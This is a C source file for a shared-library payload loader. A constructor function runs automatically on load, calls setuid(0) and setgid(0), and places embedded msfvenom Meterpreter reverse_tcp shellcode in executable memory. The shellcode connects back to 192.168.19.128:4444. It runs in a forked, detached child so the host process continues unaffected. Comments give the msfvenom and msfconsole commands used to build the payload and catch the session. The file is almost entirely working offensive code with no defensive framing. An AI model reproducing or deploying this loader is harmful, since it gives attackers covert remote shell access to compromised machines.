#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <pthread.h>

/* =========================================================
 * SHELLCODE
 * ========================================================= */

// msfvenom -p linux/x64/meterpreter/reverse_tcp  LHOST=192.168.19.128 LPORT=4444 -f c
// msfconsole -qx 'use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.19.128; run'

static unsigned char buf[] = 
"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
"\x11\x5c\xc0\xa8\x13\x80\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
"\x78\xed\xff\xe6";

/* =========================================================
 * CONTROL — change RUN_MODE to switch behavior
 * 1 = direct call
 * 2 = pthread (isolated in child process)
 * 3 = fork
 * ========================================================= */
#define RUN_MODE 2

/* exclude null terminator from size */
#define BUF_SIZE (sizeof(buf) - 1)

/* =========================================================
 * EXECUTION
 * ========================================================= */
static void *exec_buf(void *addr) {
    __asm__ volatile (
        "andq $-16, %%rsp\n"
        "callq *%0\n"
        :
        : "r"(addr)
        : "memory"
    );
    pthread_exit(NULL);  /* if shellcode returns, exit thread cleanly */
    return NULL;
}

static void run_direct(void *addr) {
    ((void (*)())addr)();
}

static void run_thread(void *addr) {
    /* fork first — isolates shellcode sys_exit from host process */
    pid_t pid = fork();
    if (pid < 0) {
        munmap(addr, BUF_SIZE);
        return;
    } else if (pid == 0) {
        /* child process — shellcode sys_exit only kills this child */
        setsid();
        pthread_t t;
        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
        if (pthread_create(&t, &attr, exec_buf, addr) != 0) {
            munmap(addr, BUF_SIZE);
            _exit(1);
        }
        pthread_attr_destroy(&attr);
        pause();    /* wait for thread to finish */
        _exit(0);
    }
    /* parent continues — host process unaffected */
}

static void run_fork(void *addr) {
    pid_t pid = fork();
    if (pid < 0) {
        munmap(addr, BUF_SIZE);
    } else if (pid == 0) {
        setsid();
        ((void (*)())addr)();
        _exit(0);
    }
}

/* =========================================================
 * CONSTRUCTOR
 * ========================================================= */
static void runmahpayload() __attribute__((constructor));

void runmahpayload() {
    setuid(0);
    setgid(0);

    if (BUF_SIZE < 4) return;

    void *addr = mmap(NULL, BUF_SIZE,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (addr == MAP_FAILED) return;

    memcpy(addr, buf, BUF_SIZE);

    if (mprotect(addr, BUF_SIZE, PROT_READ | PROT_EXEC) != 0) {
        munmap(addr, BUF_SIZE);
        return;
    }

#if   RUN_MODE == 1
    run_direct(addr);
#elif RUN_MODE == 2
    run_thread(addr);
#elif RUN_MODE == 3
    run_fork(addr);
#endif
}
